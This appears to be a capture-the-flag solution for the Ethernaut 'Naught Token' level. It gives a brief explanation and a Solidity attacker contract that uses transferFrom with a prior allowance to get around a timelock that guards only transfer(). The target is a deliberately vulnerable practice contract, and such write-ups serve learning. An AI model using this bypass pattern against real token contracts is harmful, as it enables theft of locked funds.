# Level 15 - Naught Token

- Modifier checks timestamp if transfer method is called. Transfer from can be called.
- Give allowance to spend to another contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INaughtCoin {
    function transfer(address _to, uint256 _value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

contract NaughtCoinAttacker {
    address target = 0xF373BcACdFb18e5735f59a7a1A8495a5B0a6Acdf;

    function attack() public {
        INaughtCoin(target).transferFrom(msg.sender, address(1), 1000000000000000000000000);
    }

}
```